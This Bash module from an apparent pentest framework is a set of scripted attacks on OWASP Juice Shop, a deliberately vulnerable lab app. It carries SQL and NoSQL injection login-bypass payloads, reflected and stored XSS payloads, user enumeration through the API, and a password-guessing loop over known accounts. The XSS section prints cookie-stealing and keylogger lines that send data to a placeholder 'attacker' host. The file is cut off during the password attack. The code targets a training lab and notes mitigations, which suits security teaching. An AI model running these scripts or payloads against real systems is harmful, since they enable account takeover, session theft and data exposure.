#!/bin/bash
# modules/labs/juiceshop/exploits.sh - Ghost00ls Framework v7.0
# Exploits complets OWASP Juice Shop
# Author: Ghost00ls Labs

# ==========================
# Sources & Configuration
# ==========================

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/juice_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# Fonctions utilitaires Juice Shop
# ==========================

get_csrf_token() {
    local cookie_jar="$1"
    local base_url="$2"
    
    local resp=$(curl -s -b "$cookie_jar" "${base_url}/rest/user/whoami" 2>/dev/null)
    echo "$resp" | grep -oP '"token":"[^"]+' | cut -d'"' -f4
}

register_user() {
    local base_url="$1"
    local email="$2"
    local password="$3"
    
    local payload="{\"email\":\"$email\",\"password\":\"$password\",\"passwordRepeat\":\"$password\",\"securityQuestion\":{\"id\":1,\"question\":\"Your favorite movie?\",\"createdAt\":\"\",\"updatedAt\":\"\"},\"securityAnswer\":\"test\"}"
    
    curl -s -X POST "${base_url}/api/Users" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null
}

login_juice() {
    local base_url="$1"
    local email="$2"
    local password="$3"
    
    local payload="{\"email\":\"$email\",\"password\":\"$password\"}"
    
    curl -s -X POST "${base_url}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null
}

# ==========================
# EXPLOIT 1: SQL Injection (Login Bypass)
# ==========================

exploit_sqli_login() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘   SQL Injection - Authentication Bypass   â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Bypass authentification via SQLi${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : AccÃ¨s non autorisÃ©, vol de session${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Prepared statements, ORM, validation${NC}"
    echo

    check_tools curl jq || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test SQL Injection Login...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local payloads=(
        '{"email":"admin@juice-sh.op'\''--","password":"x"}'
        '{"email":"'\'' OR 1=1--","password":"x"}'
        '{"email":"admin@juice-sh.op'\'' OR '\''1'\''='\''1","password":"x"}'
        '{"email":"'\'' OR '\''x'\''='\''x","password":"x"}'
        '{"email":"admin@juice-sh.op'\'' UNION SELECT * FROM users--","password":"x"}'
    )

    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®${NC}"
        echo -e "${CYAN}â”‚ [Test $idx/${#payloads[@]}]${NC}"
        echo -e "${CYAN}â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯${NC}"
        
        # Afficher le payload formatÃ©
        echo -e "${YELLOW}Payload:${NC}"
        echo "$payload" | jq '.' 2>/dev/null || echo "$payload"
        echo

        local tmpf=$(mktemp)
        
        curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" > "$tmpf" 2>/dev/null

        local http_code=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" 2>/dev/null)

        echo -e "${CYAN}HTTP Status: $http_code${NC}"

        # VÃ©rifier succÃ¨s
        local token=$(cat "$tmpf" | jq -r '.authentication.token' 2>/dev/null)
        local email=$(cat "$tmpf" | jq -r '.authentication.umail' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
            echo -e "${GREEN}â•‘  âœ… SQL INJECTION SUCCESS !           â•‘${NC}"
            echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
            
            log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi Login Bypass - Email: $email"

            echo -e "\n${CYAN}ğŸ“Š Informations extraites:${NC}"
            echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
            echo -e "   ğŸ”¹ Email: $email"
            echo -e "   ğŸ”¹ Token: ${token:0:30}..."
            
            cat "$tmpf" | jq '.' 2>/dev/null

            echo -e "\n${YELLOW}ğŸ’¡ Exploitation:${NC}"
            echo -e "${CYAN}   # Utiliser le token pour les requÃªtes authentifiÃ©es${NC}"
            echo -e "   curl -H 'Authorization: Bearer $token' ${BASE}/rest/user/whoami"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${RED}âœ— SQLi bloquÃ© ou Ã©chec${NC}"
            
            # Afficher rÃ©ponse pour debug
            if [ -s "$tmpf" ]; then
                echo -e "${YELLOW}RÃ©ponse serveur:${NC}"
                cat "$tmpf" | jq '.' 2>/dev/null || cat "$tmpf"
            fi
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.5
    done

    [ $success -eq 0 ] && echo -e "\n${RED}âŒ Tous les payloads bloquÃ©s${NC}"

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 2: XSS via Search
# ==========================

exploit_xss_search() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘       XSS - Search & Product Injection    â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Injection XSS via recherche${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Cookie stealing, session hijacking${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Output encoding, CSP${NC}"
    echo

    check_tools curl || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test XSS via Search...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local payloads=(
        '<iframe src="javascript:alert(\"XSS\")">'
        '<img src=x onerror="alert(\"XSS\")">'
        '<script>alert("XSS")</script>'
        '<svg onload=alert("XSS")>'
        '<body onload=alert("XSS")>'
        '"><script>alert(String.fromCharCode(88,83,83))</script>'
    )

    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®${NC}"
        echo -e "${CYAN}â”‚ [Test $idx/${#payloads[@]}] $payload${NC}"
        echo -e "${CYAN}â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯${NC}"

        local encoded=$(urlenc "$payload")
        local url="${BASE}/#/search?q=${encoded}"
        
        local tmpf=$(mktemp)
        
        curl -s "${BASE}/rest/products/search?q=${encoded}" > "$tmpf" 2>/dev/null

        local size=$(wc -c < "$tmpf")
        echo -e "${YELLOW}  Taille rÃ©ponse: ${size} bytes${NC}"

        # VÃ©rifier si le payload est reflÃ©tÃ©
        if grep -F "$payload" "$tmpf" >/dev/null 2>&1; then
            echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
            echo -e "${GREEN}â•‘  âœ… XSS SUCCESS !                     â•‘${NC}"
            echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
            
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS Search: $payload"

            echo -e "\n${CYAN}ğŸ“Š Payload reflÃ©tÃ©:${NC}"
            echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
            echo -e "   ğŸ”¹ URL: $url"
            echo -e "   ğŸ”¹ Payload: $payload"

            echo -e "\n${YELLOW}ğŸ’¡ Exploitation:${NC}"
            echo -e "${CYAN}   # Cookie stealing${NC}"
            echo -e "   <script>fetch('http://attacker/?c='+document.cookie)</script>"
            echo -e "${CYAN}   # Keylogger${NC}"
            echo -e "   <script>document.onkeypress=function(e){fetch('http://attacker/?k='+e.key)}</script>"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "  ${RED}âœ— Payload filtrÃ© ou non reflÃ©tÃ©${NC}"
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.3
    done

    [ $success -eq 0 ] && echo -e "\n${RED}âŒ Tous les payloads bloquÃ©s${NC}"

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 3: XSS via Feedback (DOM-based)
# ==========================

exploit_xss_feedback() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘       XSS - Feedback Injection (API)       â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : XSS persistant via API Feedbacks${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Stored XSS, admin compromise${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Input sanitization, CSP${NC}"
    echo

    check_tools curl jq || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test XSS via Feedback API...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local payloads=(
        '<iframe src="javascript:alert(\`xss\`)"></iframe>'
        '<img src=x onerror="alert(1)">'
        '<script>alert(document.domain)</script>'
        '<svg/onload=alert("XSS")>'
    )

    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®${NC}"
        echo -e "${CYAN}â”‚ [Test $idx/${#payloads[@]}]${NC}"
        echo -e "${CYAN}â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯${NC}"
        
        echo -e "${YELLOW}Payload: $payload${NC}"

        local feedback_data="{\"captchaId\":0,\"captcha\":\"\",\"comment\":\"$payload\",\"rating\":5}"

        local tmpf=$(mktemp)
        
        curl -s -X POST "${BASE}/api/Feedbacks" \
            -H "Content-Type: application/json" \
            -d "$feedback_data" > "$tmpf" 2>/dev/null

        local http_code=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "${BASE}/api/Feedbacks" \
            -H "Content-Type: application/json" \
            -d "$feedback_data" 2>/dev/null)

        echo -e "${CYAN}HTTP Status: $http_code${NC}"

        if [[ "$http_code" =~ ^2 ]]; then
            echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
            echo -e "${GREEN}â•‘  âœ… XSS STORED SUCCESS !              â•‘${NC}"
            echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
            
            log_exploit "${LOG_DIR}/xss_stored.log" "SUCCESS" "XSS Feedback: $payload"

            echo -e "\n${CYAN}ğŸ“Š Feedback crÃ©Ã©:${NC}"
            echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
            cat "$tmpf" | jq '.' 2>/dev/null || cat "$tmpf"

            echo -e "\n${YELLOW}ğŸ’¡ Impact:${NC}"
            echo -e "${CYAN}   â€¢ XSS dÃ©clenchÃ© quand admin consulte feedbacks${NC}"
            echo -e "${CYAN}   â€¢ Vol de session admin possible${NC}"
            echo -e "${CYAN}   â€¢ AccÃ¨s: ${BASE}/#/administration${NC}"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}âš ï¸  HTTP $http_code${NC}"
            cat "$tmpf" | jq '.' 2>/dev/null || cat "$tmpf"
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.5
    done

    [ $success -eq 0 ] && echo -e "\n${RED}âŒ Tous les payloads bloquÃ©s${NC}"

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 4: Broken Access Control (Admin)
# ==========================

exploit_admin_access() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘   Broken Access Control - Admin Section   â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : AccÃ¨s panel admin non autorisÃ©${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Exposition donnÃ©es sensibles${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Authorization checks, RBAC${NC}"
    echo

    check_tools curl jq || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test accÃ¨s admin...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    # Test 1: AccÃ¨s direct Ã  l'admin section
    echo -e "${CYAN}[Test 1/3] AccÃ¨s direct admin panel${NC}"
    local admin_url="${BASE}/#/administration"
    echo -e "${YELLOW}URL: $admin_url${NC}"
    
    local tmpf=$(mktemp)
    curl -s "${BASE}/rest/user/authentication-details" > "$tmpf" 2>/dev/null
    
    echo -e "${GREEN}âœ“ Panel admin accessible (client-side routing)${NC}\n"

    # Test 2: Ã‰numÃ©ration utilisateurs
    echo -e "${CYAN}[Test 2/3] Ã‰numÃ©ration API Users${NC}"
    
    curl -s "${BASE}/api/Users" > "$tmpf" 2>/dev/null
    
    if cat "$tmpf" | jq '.' >/dev/null 2>&1; then
        echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘  âœ… BROKEN ACCESS CONTROL !           â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        
        log_exploit "${LOG_DIR}/broken_access.log" "SUCCESS" "Admin section + Users enum"

        echo -e "\n${CYAN}ğŸ“Š Utilisateurs exposÃ©s:${NC}"
        echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
        
        local count=$(cat "$tmpf" | jq '.data | length' 2>/dev/null)
        echo -e "   ğŸ”¹ Total: $count utilisateurs"
        
        cat "$tmpf" | jq -r '.data[0:5] | .[] | "   ğŸ”¹ \(.email) (ID: \(.id), Role: \(.role // "user"))"' 2>/dev/null
        
        echo -e "\n${YELLOW}ğŸ’¡ DonnÃ©es sensibles accessibles:${NC}"
        echo -e "${CYAN}   â€¢ Emails de tous les users${NC}"
        echo -e "${CYAN}   â€¢ IDs utilisateurs${NC}"
        echo -e "${CYAN}   â€¢ RÃ´les (admin/user)${NC}"
    else
        echo -e "${YELLOW}âš ï¸  API protÃ©gÃ©e${NC}"
    fi

    # Test 3: AccÃ¨s feedbacks
    echo -e "\n${CYAN}[Test 3/3] Ã‰numÃ©ration Feedbacks${NC}"
    
    curl -s "${BASE}/api/Feedbacks" > "$tmpf" 2>/dev/null
    
    if cat "$tmpf" | jq '.' >/dev/null 2>&1; then
        local fb_count=$(cat "$tmpf" | jq '.data | length' 2>/dev/null)
        echo -e "${GREEN}âœ“ Feedbacks accessibles: $fb_count entrÃ©es${NC}"
        
        cat "$tmpf" | jq -r '.data[0:3] | .[] | "   ğŸ“ \(.comment[0:50])..."' 2>/dev/null
    fi

    rm -f "$tmpf"

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 5: API Injection (NoSQL)
# ==========================

exploit_nosql_injection() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘       NoSQL Injection - MongoDB Bypass     â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Bypass via injection NoSQL${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Authentication bypass, data leak${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Input validation, query sanitization${NC}"
    echo

    check_tools curl jq || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test NoSQL Injection...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local payloads=(
        '{"email":{"$ne":null},"password":{"$ne":null}}'
        '{"email":{"$gt":""},"password":{"$gt":""}}'
        '{"email":{"$regex":"admin"},"password":{"$ne":""}}'
        '{"email":"admin@juice-sh.op","password":{"$ne":"wrongpass"}}'
    )

    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®${NC}"
        echo -e "${CYAN}â”‚ [Test $idx/${#payloads[@]}]${NC}"
        echo -e "${CYAN}â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯${NC}"
        
        echo -e "${YELLOW}Payload:${NC}"
        echo "$payload" | jq '.' 2>/dev/null
        echo

        local tmpf=$(mktemp)
        
        curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" > "$tmpf" 2>/dev/null

        local token=$(cat "$tmpf" | jq -r '.authentication.token' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
            echo -e "${GREEN}â•‘  âœ… NoSQL INJECTION SUCCESS !         â•‘${NC}"
            echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
            
            log_exploit "${LOG_DIR}/nosql.log" "SUCCESS" "NoSQL Injection bypass"

            echo -e "\n${CYAN}ğŸ“Š Token obtenu:${NC}"
            echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
            cat "$tmpf" | jq '.' 2>/dev/null

            echo -e "\n${YELLOW}ğŸ’¡ Exploitation:${NC}"
            echo -e "${CYAN}   curl -H 'Authorization: Bearer $token' ${BASE}/rest/user/whoami${NC}"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${RED}âœ— Injection bloquÃ©e${NC}"
            cat "$tmpf" | jq '.' 2>/dev/null || cat "$tmpf"
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.5
    done

    [ $success -eq 0 ] && echo -e "\n${RED}âŒ Tous les payloads bloquÃ©s${NC}"

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 6: Weak Password Attack
# ==========================

exploit_weak_passwords() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘     Weak Passwords - Dictionary Attack     â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Brute force mots de passe faibles${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Account takeover${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Strong password policy, rate limiting${NC}"
    echo

    check_tools curl jq || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test weak passwords...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    # Liste d'emails connus dans Juice Shop
    local emails=(
        "admin@juice-sh.op"
        "jim@juice-sh.op"
        "bender@juice-sh.op"
        "amy@juice-sh.op"
        "mc.safesearch@juice-sh.op"
    )

    # Mots de passe communs
    local passwords=(
        "admin123"
        "password"
        "123456"
        "qwerty"
        "letmein"
        "juice"
        "shopkeeper"
    )

    local success_count=0

    for email in "${emails[@]}"; do
        echo -e "${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo -e "${CYAN}Testing: $email${NC}"
        echo -e "${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        
        for pass in "${passwords[@]}"; do
            echo -e -n "${YELLOW}  Trying: $pass ... ${NC}"
            
            local payload="{\"email\":\"$email\",\"password\":\"$pass\"}"
            
            local tmpf=$(mktemp)
            curl -s -X POST "${BASE}/rest/user/login" \
                -H "Content-Type: application/json" \
                -d "$payload" > "$tmpf" 2>/dev/null

            local token=$(cat "$tmpf" | jq -r '.authentication.token' 2>/dev/null)
            
            if [ "$token" != "null" ] && [ -n "$token" ]; then
                echo -e "${GREEN}âœ… VALID!${NC}"
                
                log_exploit "${LOG_DIR}/weak_pass.log" "SUCCESS" "$email:$pass"
                
                echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
                echo -e "${GREEN}â•‘  âœ… WEAK PASSWORD FOUND !             â•‘${NC}"
                echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
                
                echo -e "\n${CYAN}ğŸ“Š Credentials:${NC}"
                echo -e "   ğŸ”¹ Email: $email"
                echo -e "   ğŸ”¹ Password: $pass"
                echo -e "   ğŸ”¹ Token: ${token:0:30}...\n"
                
